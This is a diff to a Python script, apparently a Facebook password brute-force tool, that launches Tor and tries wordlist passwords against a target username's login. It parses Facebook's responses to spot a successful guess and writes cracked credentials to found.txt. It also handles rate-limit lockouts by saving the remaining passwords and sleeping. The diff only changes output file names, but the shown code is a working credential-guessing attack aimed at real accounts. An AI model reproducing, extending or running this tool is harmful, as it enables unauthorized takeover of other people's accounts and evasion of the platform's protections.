@@ -6,10 +6,10 @@ requests.packages.urllib3.disable_warnings()
 os.system('service tor start && clear')
 print("\033[1m\033[91m  █████▒▄▄▄       ▄████▄  ▓█████  ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████ \n▓██   ▒▒████▄    ▒██▀ ▀█  ▓█   ▀ ▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ \n▒████ ░▒██  ▀█▄  ▒▓█    ▄ ▒███   ▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███   \n░▓█▒  ░░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓█  ▄ ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ \n░▒█░    ▓█   ▓██▒▒ ▓███▀ ░░▒████▒░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒\n ▒ ░    ▒▒   ▓▒█░░ ░▒ ▒  ░░░ ▒░ ░░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░\n ░       ▒   ▒▒ ░  ░  ▒    ░ ░  ░▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░\n ░ ░     ░   ▒   ░           ░    ░    ░   ░░   ░  ░░░ ░ ░   ░         ░\n \033[97mCoded by : http://github.com/graysuit\n Meet him : http://fb.com/gray.programmerz.5 \n Wordlist Generator : http://github.com/graysuit/wGen")
 email,wlist,IP=input(' \033[92m[+] Enter Username : '),input(' [+] Enter Wordlist name, Default:password.txt : '),input(' [+] Should I display Public IP? Default:y, y/n : ')
-print(' [+] Removing duplicate words in '+wlist+'\n [+] Only passwords >= 6 will be used.\n [+] Open response.txt to view complete responses by facebook.')
+print(' [+] Removing duplicate words in '+wlist+'\n [+] Only passwords >= 6 will be used.\n [+] Open '+email+'response.txt to view complete responses by facebook.')
 l = 1
 if IP == 'n' or IP == 'N':l = ''
-if os.path.exists(email+'response.txt'):os.remove(email+'response.txt')
+if os.path.exists(email+'_response.txt'):os.remove(email+'_response.txt')
 if wlist=='':wlist='password.txt'
 if not os.path.exists(wlist):quit(' \033[91m[-] '+wlist+' doesn\'t exits\033[97m')
 print('\033[97m')
@@ -41,13 +41,13 @@ def function(email,passw):
 		for s in soup(["style","script"]):s.decompose()
 		clean = re.sub("To personalize content, tailor and measure ads, and provide a safer experience, we use cookies. By tapping on the site, you agree to our use of cookies on and off Facebook. Learn more, including about controls: Cookies Policy . Facebook ","", re.sub(' +',' ',soup.get_text()))
 		print('\n ['+str(k)+'/'+str(g)+'] Trying',passw+' '+e+' FB says '+clean[:28])
-		open('response.txt','a').write(clean+' '+passw)
+		open(email+'_response.txt','a').write(clean+' '+passw)
 		if 'Facebook ' in clean[:9] or 'Please confirm your identity' in clean or 'Your account has been temporarily locked' in clean:
 			open('found.txt','a').write('\nUsername='+email+' Password='+passw)
 			quit('\n \033[1;32m[+] Congrats!!! Password is : '+passw+' [+] Saved : found.txt\n\n')
 		elif'Please try again later'in clean or 'You Can\'t Do That Right Now' in  clean:
-			open(email+'left_password.txt','a').write(passw+'\n')
-			print('\033[93m [+] IP used so much.\n [+] Password Saved in left_password.txt')
+			open(email+'_left_password.txt','a').write(passw+'\n')
+			print('\033[93m [+] IP used so much.\n [+] Password Saved in '+email+'_left_password.txt')
 			m = input(' [+] Enter minutes to sleep for or nothing for no sleep : ')
 			if(m.isdigit()):
 				print(' [+] Waiting for '+m+' minutes...\033[97m')
